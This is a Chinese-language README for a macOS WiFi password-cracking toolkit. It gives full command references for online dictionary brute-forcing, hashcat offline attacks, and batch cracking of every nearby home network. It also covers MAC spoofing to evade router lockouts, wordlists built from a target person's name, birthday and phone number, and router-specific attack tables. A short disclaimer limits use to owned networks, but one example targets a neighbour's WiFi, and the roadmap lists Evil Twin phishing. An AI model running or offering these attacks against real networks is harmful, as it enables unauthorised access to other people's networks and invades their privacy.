# WiFi 安全测试工具包 v4.0

基于 macOS Apple Silicon (M1/M2/M3/M4) 的家庭 WiFi 安全测试套件。纯内置网卡，无需外置设备。融合在线开源字典 + 本地智能生成，自动识别家庭 WiFi 与企业/校园网络。

**v4.0 新特性**：Markov链智能密码排序 | PCFG概率结构生成 | 自动化多轮破解流水线 | 规则/混合/Brain模式hashcat | MAC自动轮换 | 智能自适应延迟 | 密码强度预估+攻击策略推荐

## 法律声明

**本工具仅限对自己拥有或已获得书面授权的网络进行安全测试。**

未经授权访问他人网络违反《中华人民共和国网络安全法》第二十七条，可处五日以下拘留并处罚款。使用本工具所产生的一切法律后果由使用者自行承担，作者不承担任何责任。

## 功能模块

| 模块 | 文件 | 功能 | 语言 |
| --- | --- | --- | --- |
| 主控制台 | main.py | 菜单驱动统一入口（v4.0 集成全部新功能） | Python |
| WiFi 扫描器 | wifi_scanner.py | CoreWLAN 扫描 + **密码强度预估 + 攻击策略推荐** | Python |
| Go 扫描器 | wifi-scanner | system_profiler 高速扫描，编译为单一二进制 | Go |
| 字典下载器 | download_dicts.py | 从 GitHub 下载 6 个高频密码字典（SecLists/中国Top10万） | Python |
| 字典生成器 | wordlist_gen.py | 融合在线字典 + 手机号/生日/拼音/键盘 + **PCFG概率结构生成** | Python |
| 在线破解器 | wifi_cracker.py | networksetup 破解 + **MAC自动轮换 + 智能自适应延迟** | Python |
| Hashcat 辅助 | hashcat_helper.py | hashcat 离线破解 + **规则攻击/混合攻击/Brain模式/中国特化规则** | Python |
| **智能排序器** | password_ranker.py | **Markov链 + PCFG + 中国密码特征的智能密码概率排序（v4.0新增）** | Python |
| **自动破解流水线** | auto_crack.py | **多轮智能攻击：品牌识别→策略选择→MAC轮换→自动攻击（v4.0新增）** | Python |
| **批量破解器** | batch_crack.py | **自动扫描全部家庭WiFi→逐个攻击→密码统一保存（v4.0新增）** | Python |
| 网络分析器 | network_analyzer.py | 网关探测/局域网设备扫描/测速/路由器识别 | Python |
| 钥匙串提取 | keychain_extract.py | 从 macOS 钥匙串提取已保存 WiFi 名称和密码 | Python |
| 社工字典 | smart_dict.py | 根据目标个人信息（姓名/生日/手机号）生成定向字典 | Python |
| MAC 伪装 | mac_spoof.py | 随机化/恢复 MAC 地址，规避 AP 封禁 | Python |
| 位置权限修复 | fix_location.py | 解决 macOS 13+ SSID 被隐藏的权限问题 | Python |

## 环境要求

| 项目 | 要求 | 备注 |
| --- | --- | --- |
| 系统 | macOS 13+ (Ventura / Sonoma / Sequoia / Tahoe) | Apple Silicon 或 Intel 均可 |
| Python | 3.10+ | 推荐 3.12 |
| Go | 1.20+ | 仅编译 Go 扫描器时需要，可选 |
| hashcat | 7.0+ | 离线破解需要，brew install hashcat |
| hcxtools | 6.0+ | 握手包格式转换，brew install hcxtools |

## Mac 部署步骤（一键）

```bash
# 1. 进入项目目录
cd ~/Downloads/Wi-Fi破解

# 2. 安装 Python 依赖
pip3 install -r requirements.txt

# 3. 安装系统工具（推荐）
brew install hashcat hcxtools

# 4. 修复位置权限（获取 SSID 名称，首次必做）
python3 scripts/fix_location.py

# 5. 下载在线密码字典
python3 scripts/download_dicts.py

# 6. 生成智能密码字典（62.6万条）
python3 scripts/wordlist_gen.py

# 7. 编译 Go 扫描器（可选）
cd go_tools/scanner && go build -o ../../wifi-scanner . && cd ../..

# 8. 启动主控制台
python3 scripts/main.py
```

## Windows 部署步骤

```cmd
:: 1. 安装 Python 3.10+ (python.org)
:: 2. 安装依赖
pip install scapy pywifi rich

:: 3. 下载字典
python scripts/download_dicts.py

:: 4. 生成字典
python scripts/wordlist_gen.py

:: 注意：Windows 不支持 CoreWLAN，扫描使用 netsh 命令
:: WiFi 连接尝试使用 netsh wlan connect 替代 networksetup
:: 推荐使用 Hashcat 离线破解模式
```

## 完整命令参考

### 主控制台（推荐入口）

```bash
python3 scripts/main.py
```

菜单选项：扫描 → 下载字典 → 生成字典 → 破解 → Hashcat → 网络分析 → 查看记录

### WiFi 扫描

```bash
# 单次扫描（仅显示家庭WiFi，自动隐藏企业/校园网络）
python3 scripts/wifi_scanner.py

# 显示全部网络（含企业/开放）
python3 scripts/wifi_scanner.py -a

# 持续扫描（每3秒刷新，实时监控周围网络变化）
python3 scripts/wifi_scanner.py -c -i 3

# 保存扫描结果为 JSON
python3 scripts/wifi_scanner.py -s
python3 scripts/wifi_scanner.py -s -o my_scan.json

# JSON 格式输出（供其他程序读取）
python3 scripts/wifi_scanner.py --json

# v4.0: 密码强度预估 + 攻击策略推荐
python3 scripts/wifi_scanner.py --strength

# Go 高速扫描器
./wifi-scanner
./wifi-scanner --json
```

### 密码字典下载

```bash
# 下载全部6个在线字典（SecLists + 中国Top10万 + 弱密码）
python3 scripts/download_dicts.py
```

下载源：

| 字典 | 条数 | 来源 |
| --- | --- | --- |
| SecLists WPA Top4800 | 4,800 | danielmiessler/SecLists |
| SecLists WPA Top447 | 447 | danielmiessler/SecLists |
| 中国常用密码 Top10000 | 5,067 | NihaoKangkang/Chinese-Common-Password-List |
| 中国常用密码 Top1000 | 541 | NihaoKangkang/Chinese-Common-Password-List |
| 中国常用密码 Top100000 | 44,082 | NihaoKangkang/Chinese-Common-Password-List |
| 中国弱密码 Top1000 | 552 | LandGrey/pydictor |

### 密码字典生成

```bash
# 完整生成（含8种模式：7种基础 + PCFG概率结构）
python3 scripts/wordlist_gen.py

# 快速模式（仅高频密码，约9700条，适合先快速尝试）
python3 scripts/wordlist_gen.py --quick

# 指定手机号前缀（缩小范围，如只生成138/139开头的手机号密码）
python3 scripts/wordlist_gen.py --phone-prefix 138 139 188

# 指定生日范围（如目标户主是80后/90后）
python3 scripts/wordlist_gen.py --year-start 1980 --year-end 1999

# 自定义输出路径
python3 scripts/wordlist_gen.py -o wordlists/custom.txt

# 自定义密码长度（默认8-20，WiFi最少8位）
python3 scripts/wordlist_gen.py --min-len 8 --max-len 12
```

生成的密码类型（按命中概率排序）：

| 优先级 | 类型 | 示例 | 说明 |
| --- | --- | --- | --- |
| 1 | 核心高频 | 12345678, woaini520 | 113条手工精选，命中率最高 |
| 2 | 在线字典 | 来自真实泄露数据统计 | SecLists + 中国Top10000 |
| 3 | 纯数字 | 88888888, 13572468 | 重复/顺序/吉利数字 |
| 4 | 手机号码 | 138XXXX0000 | 41个前缀 × 高频尾号 |
| 5 | 生日日期 | 19901225, 12251990 | YYYYMMDD / MMDDYYYY |
| 6 | 拼音组合 | woaini123, wang1234 | 常见词汇 + 数字后缀 |
| 7 | 键盘模式 | qwerty123, 1qaz2wsx | 键盘布局行走模式 |
| 8 | PCFG结构 | love1234, wang5200 | v4.0 概率上下文无关文法生成（L4D4/L5D3等高频结构） |

### WiFi 密码破解

```bash
# 指定目标 + 完整字典（推荐）
python3 scripts/wifi_cracker.py -t "邻居WiFi名" -w wordlists/wifi_dict_final.txt

# 先用快速字典试（9700条，约40分钟）
python3 scripts/wifi_cracker.py -t "TP-LINK_5G_XXXX" -w wordlists/online/chinese_top10000.txt

# 调整尝试间隔（默认0.5秒，降低可能被AP拉黑）
python3 scripts/wifi_cracker.py -t "TARGET" -w wordlists/wifi_dict_final.txt -d 1.0

# 快速模式（无间隔，速度最快约4次/秒，但可能被拒绝）
python3 scripts/wifi_cracker.py -t "TARGET" -w wordlists/wifi_dict_final.txt -d 0

# 不使用断点续传（从头开始）
python3 scripts/wifi_cracker.py -t "TARGET" -w wordlists/wifi_dict_final.txt --no-resume

# 交互模式（从Mac已保存WiFi列表中选择目标）
python3 scripts/wifi_cracker.py -w wordlists/wifi_dict_final.txt

# v4.0: 启用MAC自动轮换（每100次失败后更换MAC，规避AP封禁）
python3 scripts/wifi_cracker.py -t "TARGET" -w wordlists/wifi_dict_final.txt --mac-rotate 100

# v4.0: 启用智能自适应延迟（自动检测AP限速/封禁并调整）
python3 scripts/wifi_cracker.py -t "TARGET" -w wordlists/wifi_dict_final.txt --adaptive

# v4.0: 组合使用（推荐：MAC轮换 + 自适应延迟 + 断点续传）
python3 scripts/wifi_cracker.py -t "TARGET" -w wordlists/wifi_dict_final.txt --mac-rotate 100 --adaptive
```

破解器特性：
- **断点续传**：Ctrl+C 中断后自动保存进度，下次运行从断点继续
- **智能目标选择**：从 Mac 已保存 WiFi 列表中筛选家庭网络，自动排除企业/校园WiFi
- **实时进度**：显示百分比、速度、预计剩余时间
- **成功记录**：破解成功自动保存到 captures/cracked.json
- **MAC自动轮换（v4.0）**：每N次失败后自动更换MAC地址，规避AP封禁
- **智能自适应延迟（v4.0）**：根据AP响应时间动态调整延迟，检测到封禁自动触发MAC轮换
- **定期保存进度（v4.0）**：每500次自动保存，防止意外断电丢失进度

### Hashcat 离线破解

```bash
# 检查环境（hashcat + hcxtools 是否已安装）
python3 scripts/hashcat_helper.py check

# 转换握手包格式（.cap/.pcap → .hc22000）
python3 scripts/hashcat_helper.py convert captures/handshake.cap

# 字典攻击（使用生成的字典）
python3 scripts/hashcat_helper.py crack captures/target.hc22000 -w wordlists/wifi_dict_final.txt

# 列出可用字典
python3 scripts/hashcat_helper.py crack captures/target.hc22000 --list-wordlists

# 纯数字掩码暴力攻击（8-12位，M1约8分钟破完8位）
python3 scripts/hashcat_helper.py mask captures/target.hc22000
python3 scripts/hashcat_helper.py mask captures/target.hc22000 --min 8 --max 11

# v4.0: 规则攻击（字典 + 变异规则，大幅扩展覆盖率）
python3 scripts/hashcat_helper.py rule captures/target.hc22000 -w wordlists/wifi_dict_final.txt
python3 scripts/hashcat_helper.py rule captures/target.hc22000 -w wordlists/wifi_dict_final.txt -r rules/chinese.rule

# v4.0: 混合攻击（字典 + 掩码组合，如密码后追加4位数字）
python3 scripts/hashcat_helper.py hybrid captures/target.hc22000 -w wordlists/wifi_dict_final.txt
python3 scripts/hashcat_helper.py hybrid captures/target.hc22000 -w wordlists/wifi_dict_final.txt -m "?d?d?d"

# v4.0: 智能攻击（自动推荐最优策略，支持指定路由器品牌）
python3 scripts/hashcat_helper.py smart captures/target.hc22000
python3 scripts/hashcat_helper.py smart captures/target.hc22000 --brand tp-link

# v4.0: 生成中国密码特化规则文件
python3 scripts/hashcat_helper.py gen-rules

# 直接调用 hashcat（高级用户）
hashcat -m 22000 -a 0 captures/target.hc22000 wordlists/wifi_dict_final.txt
hashcat -m 22000 -a 3 captures/target.hc22000 ?d?d?d?d?d?d?d?d           # 8位数字
hashcat -m 22000 -a 0 -r rules/chinese.rule \
    captures/target.hc22000 wordlists/wifi_dict_final.txt                  # 中国特化规则变异
```

### 网络分析（连接成功后使用）

```bash
# 完整分析（网关/设备/测速/路由器识别）
python3 scripts/network_analyzer.py

# 仅测速
python3 scripts/network_analyzer.py --speed-only

# 仅扫描局域网设备
python3 scripts/network_analyzer.py --devices-only
```

### 钥匙串 WiFi 密码提取（macOS 独有）

```bash
# 列出 Mac 上所有已保存的 WiFi 名称（自动分类家庭/企业）
python3 scripts/keychain_extract.py

# 提取已保存 WiFi 的密码（系统会弹出授权对话框）
python3 scripts/keychain_extract.py -e

# 提取指定 SSID 的密码
python3 scripts/keychain_extract.py -e -s "目标WiFi名"

# 提取并分析密码模式（纯数字比例/长度分布）
python3 scripts/keychain_extract.py -e -a
```

用途：提取已知密码 → 分析密码模式 → 反向优化字典生成策略

### 社工字典生成（目标定向破解）

```bash
# 交互式输入目标信息（姓名/生日/手机号/QQ等）
python3 scripts/smart_dict.py

# 命令行直接指定（自动化）
python3 scripts/smart_dict.py --name zhangsan --birthday 19901225 --phone 13812345678

# 根据目标 SSID 推测路由器品牌并加入默认密码模式
python3 scripts/smart_dict.py --name liming --ssid "TP-LINK_5G_A1B2"

# 指定输出路径
python3 scripts/smart_dict.py -o wordlists/target_liming.txt
```

原理：中国用户常用「姓名拼音 + 生日 + 手机号」的组合作为密码。输入目标信息后自动生成数百到数千条高针对性密码。

### MAC 地址伪装（规避 AP 封禁）

```bash
# 查看当前 MAC 地址
python3 scripts/mac_spoof.py

# 随机化 MAC 地址（自动关闭WiFi→改MAC→重新开启）
sudo python3 scripts/mac_spoof.py -r

# 恢复原始 MAC 地址
sudo python3 scripts/mac_spoof.py --restore

# 设置指定 MAC 地址
sudo python3 scripts/mac_spoof.py --set AA:BB:CC:DD:EE:FF
```

用途：当路由器检测到多次失败连接并封禁 MAC 地址时，更换 MAC 后可继续尝试。

### 智能密码排序（v4.0 新增）

```bash
# 对字典进行Markov链概率排序（高概率密码排前面，缩短命中时间30-50%）
python3 scripts/password_ranker.py wordlists/wifi_dict_final.txt

# 指定输出路径（不覆盖原文件）
python3 scripts/password_ranker.py wordlists/wifi_dict_final.txt -o wordlists/ranked.txt
```

排序原理：
- **Markov链评分**：基于字符级n-gram统计，计算每个密码的字符转移概率
- **PCFG结构分析**：识别密码结构模式（如L4D4=4字母+4数字），匹配高频结构加分
- **中国密码特征增强**：对吉利数字（520/1314/888）、手机号前缀、生日模式等加权

### 自动破解流水线（v4.0 新增）

```bash
# 一键启动多轮智能攻击（自动识别路由器品牌 → 选择策略 → 执行攻击）
python3 scripts/auto_crack.py -t "TARGET_SSID"

# 启用MAC轮换（推荐）
python3 scripts/auto_crack.py -t "TARGET_SSID" --mac-rotate

# 扫描选择目标（不指定SSID时进入交互选择）
python3 scripts/auto_crack.py --mac-rotate
```

流水线攻击轮次：
1. **社工字典**（如有）→ 约2分钟
2. **快速高频字典** → 约40分钟
3. **Markov排序字典** → 自动对字典概率排序后攻击
4. **完整字典** → 覆盖全部密码模式
5. 每轮间自动MAC轮换，智能跳过已尝试密码

### 批量WiFi破解（v4.0 新增）

```bash
# 自动扫描周围所有家庭WiFi → 按难度+信号排序 → 逐个快速攻击
python3 scripts/batch_crack.py

# 中等深度（含SecLists约5万条）
python3 scripts/batch_crack.py --depth medium

# 完整深度（含全部字典）
python3 scripts/batch_crack.py --depth full

# 手动指定多个目标SSID
python3 scripts/batch_crack.py --targets "WiFi_A" "WiFi_B" "WiFi_C"

# 每个字典限制最多5000条（快速扫一遍所有WiFi）
python3 scripts/batch_crack.py --max-per-dict 5000

# 查看所有已破解的WiFi密码
python3 scripts/batch_crack.py --show-cracked

# 清除进度重新开始
python3 scripts/batch_crack.py --reset
```

批量破解特性：
- **自动扫描**：自动识别周围所有家庭WiFi，跳过企业/开放网络
- **智能排序**：按密码难度（低→高）+ 信号强度排序，优先攻击弱密码WiFi
- **断点续传**：已破解/已耗尽的目标自动跳过
- **统一保存**：所有破解成功的密码保存到 `captures/cracked.json`

> **注意**：macOS 仅有一个WiFi网卡，硬件层面无法同时连接多个AP，因此采用"批量串行"策略

### 位置权限修复

```bash
# 自动请求权限（弹出系统授权对话框）
python3 scripts/fix_location.py
```

macOS 13+ 将 WiFi SSID/BSSID 视为位置数据。未授权时扫描结果中 SSID 显示为空。授权方法：
1. 运行 fix_location.py，在弹窗中点击"允许"
2. 或手动：系统设置 → 隐私与安全 → 位置服务 → 勾选终端/Python

### 查看已破解记录

```bash
# 通过主控台查看
python3 scripts/main.py
# 选择 [7] 查看已破解的WiFi

# 直接查看 JSON 文件
cat captures/cracked.json
```

## 技术原理

### 方案一：在线破解（本工具核心方案）

通过 macOS 系统命令 `networksetup -setairportnetwork en0 "SSID" "密码"` 逐个尝试密码连接目标 WiFi。连接后通过 `networksetup -getairportnetwork en0` 验证是否成功。

```
[字典] → 逐条读取密码 → networksetup 尝试连接 → 检测连接状态 → 成功/继续
```

| 指标 | 数值 |
| --- | --- |
| 实测速度 | 约 3.9 次/秒（无延迟） |
| 安全间隔 | 建议 0.5s（约 1.5 次/秒） |
| 62.6万条字典耗时 | 约 45 小时（0.5s间隔）/ 约 11 小时（无间隔） |
| 中国Top1万字典耗时 | 约 1 小时（0.5s间隔）/ 约 20 分钟（无间隔） |
| 快速字典（9700条）| 约 40 分钟（0.5s间隔） |

### 方案二：Hashcat 离线破解（需要握手包）

如果通过其他渠道获得了目标 WiFi 的 WPA2 握手包（.cap 文件）或 PMKID，可使用 hashcat 进行 GPU 加速离线破解。

| 指标 | Apple M1 |
| --- | --- |
| hashcat WPA2 模式22000 | 约 300 kH/s |
| hashcat PMKID 模式22001 | 约 245 MH/s |
| 8位纯数字暴力破解 | 约 8 分钟（模式22000） |
| 62.6万条字典 | 约 2 秒 |

### 家庭 WiFi 识别原理

通过 CoreWLAN API 读取每个网络的 securityType 进行分类：

| securityType | 含义 | 分类 | 可破解 |
| --- | --- | --- | --- |
| 0 | 开放网络 | 开放 | 无需密码 |
| 2, 8, 128 | WPA/WPA2-Personal | 家庭WiFi | 是（PSK密码） |
| 32, 2048, 4224 | WPA3/Transition | 家庭WiFi | 是（PSK密码） |
| 4, 16, 64 | WPA/WPA2/WPA3-Enterprise | 企业/校园 | 否（802.1X认证） |

家庭WiFi 使用预共享密钥（PSK），通过字典可以尝试破解。
企业WiFi 使用 802.1X/EAP 认证（如校园网 iXAUT-1X），需要用户名+密码+证书，无法通过字典破解。

## 项目结构

```
Wi-Fi破解/
├── README.md                           # 本文件
├── requirements.txt                    # Python 依赖
├── wifi-scanner                        # Go 扫描器二进制 (3.3MB)
├── .github/workflows/build.yml        # GitHub Actions 自动打包
├── scripts/
│   ├── main.py                        # 主控制台 v4.0（菜单入口）
│   ├── wifi_scanner.py                # WiFi 扫描器 v3.0（密码强度预估+攻击策略）
│   ├── download_dicts.py              # 在线字典下载器
│   ├── wordlist_gen.py                # 智能字典生成器（含PCFG概率结构）
│   ├── wifi_cracker.py                # 在线破解器（MAC轮换+自适应延迟）
│   ├── hashcat_helper.py              # Hashcat 辅助（规则/混合/Brain/中国特化）
│   ├── password_ranker.py             # ★ v4.0 Markov链智能密码排序器
│   ├── auto_crack.py                  # ★ v4.0 自动化多轮破解流水线
│   ├── batch_crack.py                 # ★ v4.0 批量WiFi串行破解器
│   ├── network_analyzer.py            # 网络分析器
│   ├── keychain_extract.py            # macOS 钥匙串密码提取
│   ├── smart_dict.py                  # 社工字典生成器（CUPP风格）
│   ├── mac_spoof.py                   # MAC 地址伪装
│   └── fix_location.py               # 位置权限修复
├── wordlists/
│   ├── wifi_dict_final.txt            # 最终合并字典 (含PCFG结构密码)
│   └── online/                        # 在线下载的字典
│       ├── seclists_wpa_top4800.txt   # 4,800条
│       ├── seclists_wpa_top447.txt    # 447条
│       ├── chinese_top10000.txt       # 5,067条 (≥8位过滤后)
│       ├── chinese_top100000.txt      # 44,082条 (≥8位过滤后)
│       ├── chinese_top1000.txt        # 541条
│       └── chinese_weak1000.txt       # 552条
├── rules/                              # ★ v4.0 hashcat规则文件目录
│   └── chinese.rule                   # 中国密码特化规则（自动生成）
├── captures/                           # 扫描结果/破解记录/握手包
│   ├── cracked.json                   # 已破解密码记录
│   ├── auto_progress.json             # 自动破解流水线进度
│   └── batch_progress.json            # 批量破解进度记录
├── go_tools/scanner/                   # Go 扫描器源码
└── docs/                               # 文档
```

## 推荐破解策略

### 最优流程（按耗时排序）

```
第0轮：社工字典（数百条）   → 约2分钟   → 基于目标个人信息，命中率最高
第1轮：快速字典（9,700条）  → 约40分钟  → 覆盖最常见密码
第2轮：Markov排序字典       → 约5小时   → v4.0 高概率密码优先，命中速度提升30-50%
第3轮：完整字典（含PCFG）   → 约45小时  → 覆盖手机号/生日/拼音/PCFG结构
第4轮：Hashcat离线（需握手包）→ 秒级    → GPU加速，字典+规则+混合+掩码
```

> **v4.0 推荐**：使用 `python3 scripts/auto_crack.py --mac-rotate` 一键执行全部轮次，自动MAC轮换+进度保存

```bash
# 第0轮（如果了解目标人物信息）
python3 scripts/smart_dict.py --name liming --birthday 19901225 --phone 13812345678
python3 scripts/wifi_cracker.py -t "目标" -w wordlists/smart_target.txt

# 第1轮
python3 scripts/wifi_cracker.py -t "目标" -w wordlists/online/chinese_top10000.txt

# 第2轮
python3 scripts/wifi_cracker.py -t "目标" -w wordlists/online/chinese_top100000.txt

# 第3轮
python3 scripts/wifi_cracker.py -t "目标" -w wordlists/wifi_dict_final.txt

# 第4轮（需要握手包文件）
python3 scripts/hashcat_helper.py crack target.hc22000 -w wordlists/wifi_dict_final.txt
```

### 针对特定路由器

| 路由器品牌 | 默认SSID格式 | 默认密码特征 | 破解建议 |
| --- | --- | --- | --- |
| TP-Link | TP-LINK_XXXX | 8位纯数字（MAC后8位） | 掩码攻击 ?d?d?d?d?d?d?d?d |
| 小米/Redmi | MiWiFi-XXXX | 用户首次设置 | 字典攻击 |
| 华为/荣耀 | HUAWEI-XXXX | 8位随机字母数字 | 字典 + 规则变异 |
| 腾达 | Tenda_XXXX | 8位纯数字 | 掩码攻击 |
| 水星 | MERCURY_XXXX | 8位纯数字 | 掩码攻击 |
| 迅捷 | FAST_XXXX | 8位纯数字 | 掩码攻击 |
| 中国移动光猫 | CMCC-XXXX | 8位纯数字（MAC后8位） | 掩码攻击 |
| 中国电信光猫 | ChinaNet-XXXX | 8位纯数字 | 掩码攻击 |

## 当前局限性

### 1. macOS 内置网卡不支持监控模式

**影响**：无法进行以下操作
- 无法捕获 WPA2 四次握手包（需要 Deauth + 监控模式抓包）
- 无法执行 PMKID 攻击（需要发送关联请求帧）
- 无法执行 Deauth 去认证攻击（需要注入原始802.11帧）
- 无法创建 Evil Twin 伪造热点

**根本原因**：Apple 从硬件驱动层面禁止了内置 WiFi 芯片进入 Monitor Mode，且 macOS 不提供原始 802.11 帧注入接口。

### 2. 在线破解速度慢

**影响**：`networksetup` 命令每次连接尝试约需 0.26 秒，加上安全延迟后约 0.7 秒/次。62.6 万条字典需要约 45 小时。

**根本原因**：每次尝试都经历完整的 WiFi 关联流程（Probe → Auth → Association → 4-Way Handshake），而非像 hashcat 那样纯计算。

### 3. macOS 26 SSID 隐私限制

**影响**：CoreWLAN 和 system_profiler 扫描到的网络 SSID/BSSID 全部显示为空或 `<redacted>`，即使 sudo 也无法获取。

**根本原因**：macOS 13+ 将 WiFi 标识视为位置数据，需要应用获得位置服务授权。macOS 26 进一步加强了限制，sudo 也不再绕过。

**解决方法**：运行 `fix_location.py` 或手动在系统设置中授权终端的位置权限。

### 4. AP 反暴力破解机制

**影响**：部分高端路由器检测到连续失败连接后会临时拉黑 MAC 地址（通常 5-30 分钟）。

**v4.0 缓解措施**：
- MAC自动轮换（`--mac-rotate 100`）：每100次失败自动更换MAC地址
- 智能自适应延迟（`--adaptive`）：检测到响应变慢时自动增加延迟，检测到疑似封禁时触发MAC轮换
- 自动破解流水线（`auto_crack.py`）：每轮攻击间自动MAC轮换

### 5. WPA3-SAE 抗暴力破解

**影响**：WPA3 使用 SAE（Simultaneous Authentication of Equals）协议，天然抗离线字典攻击。即使获得握手数据也无法离线破解。

**现状**：目前中国家庭路由器大多仍使用 WPA2-Personal 或 WPA3-Transition 模式（兼容 WPA2 回退），纯 WPA3 尚未普及。

### 6. 字典覆盖率有限

**影响**：62.6 万条字典无法覆盖所有可能的密码组合。理论上 8 位纯小写字母有 2000 亿种组合，8 位混合字符有 6.6 万亿种。

**实际命中率**：根据统计，中国家庭 WiFi 密码约 60-70% 为纯数字（8-11位），其中大量为手机号、生日、重复数字。本字典在纯数字场景覆盖率较高。

## 优化路线图

### 近期可实现（无需额外硬件）

| 优化项 | 预期效果 | 实现方式 | 状态 |
| --- | --- | --- | --- |
| 多线程并发 | 速度提升2-3倍 | 同时用多个虚拟网卡接口尝试（受限于macOS单WiFi接口） | 待定 |
| hashcat 规则变异 | 字典覆盖率大幅提升 | 规则攻击+混合攻击+Brain模式+中国特化规则 | **v4.0 已完成** |
| 自定义字典模板 | 针对性提高 | 支持用户输入目标信息生成定向字典 | **v3.0 已完成** |
| MAC 地址轮换 | 规避 AP 封禁 | 每 N 次尝试后自动随机化 MAC 地址 | **v4.0 已完成** |
| 路由器品牌识别 | 预判默认密码模式 | 通过SSID+OUI识别厂商，密码强度预估+攻击策略推荐 | **v4.0 已完成** |
| 社工字典生成 | 极高命中率 | 输入目标姓名/生日/手机号，自动组合生成高针对性字典 | **v3.0 已完成** |
| Markov链密码排序 | 命中速度提升30-50% | 基于字符转移概率对字典重新排序 | **v4.0 已完成** |
| PCFG概率结构生成 | 扩展字典覆盖率 | 基于概率上下文无关文法生成结构化密码 | **v4.0 已完成** |
| 自动破解流水线 | 一键多轮攻击 | 自动执行多轮策略+MAC轮换+进度保存 | **v4.0 已完成** |
| 智能自适应延迟 | 规避AP限速/封禁 | 根据AP响应时间动态调整延迟 | **v4.0 已完成** |

### 中期优化（需要额外硬件）

| 优化项 | 预期效果 | 所需设备 | 预算 |
| --- | --- | --- | --- |
| 外置 USB WiFi 网卡 | 解锁监控模式、抓握手包、PMKID 攻击 | ALFA AWUS036ACHM | ¥200-300 |
| Flipper Zero + WiFi Marauder | 自动捕获路由器握手包/PMKID | Flipper Zero + WiFi Dev Board | ¥1500 |
| Pwnagotchi (树莓派) | 24小时自动巡航捕获握手包 | Raspberry Pi Zero 2W + ALFA网卡 | ¥400 |
| 云端 GPU 破解 | hashcat 速度提升 10-100 倍 | AWS/阿里云 GPU 实例 | 按小时计费 |

### 长期方向

| 方向 | 说明 |
| --- | --- |
| PMKID 攻击集成 | 有了外置网卡后，直接从 AP 提取 PMKID，无需等待客户端连接 |
| Evil Twin 钓鱼 | 创建同名伪造 AP → 受害者连接 → 弹出假登录页面获取密码 |
| AI 密码预测 | 基于目标路由器品牌、SSID 命名模式训练模型预测密码 |
| 分布式破解 | 多台机器协同跑不同字典段，线性加速 |
| Android/iOS 联动 | 手机端 WiFi 扫描 + 握手包捕获，传回 Mac 离线破解 |

## 速度对比参考

| 方法 | 速度 | 62.6万字典耗时 | 8位纯数字穷举 |
| --- | --- | --- | --- |
| 本工具在线破解（networksetup） | 约 4 次/秒 | 约 45 小时 | 不可行（需 289 天） |
| hashcat M1 (模式 22000) | 约 300k 次/秒 | 约 2 秒 | 约 8 分钟 |
| hashcat RTX 4090 (模式 22000) | 约 2.5M 次/秒 | 约 0.3 秒 | 约 40 秒 |
| hashcat M1 PMKID (模式 22001) | 约 245M 次/秒 | 瞬间 | 约 0.4 秒 |
| 在线破解服务 | 变化大 | 变化大 | 变化大 |

**结论**：在线破解适合配合小型高频字典（Top1万）快速尝试；大规模破解应优先获取握手包后使用 hashcat。

## 数据源致谢

| 项目 | 链接 | 说明 |
| --- | --- | --- |
| SecLists | github.com/danielmiessler/SecLists | 全球最大安全测试资源集合 |
| Chinese-Common-Password-List | github.com/NihaoKangkang/Chinese-Common-Password-List | 中国常用密码频率排行 |
| pydictor | github.com/LandGrey/pydictor | 中国弱密码字典 |
| MacWifiBruteForce | github.com/CaptainMcCrank/MacWifiBruteForce | macOS WiFi暴力破解参考 |
| hashcat | hashcat.net | GPU 加速密码恢复工具 |
| hcxtools | github.com/ZerBea/hcxtools | 握手包处理工具集 |

## 作者

微信: 1837620622（传康Kk）
邮箱: 2040168455@qq.com
咸鱼/B站: 万能程序员
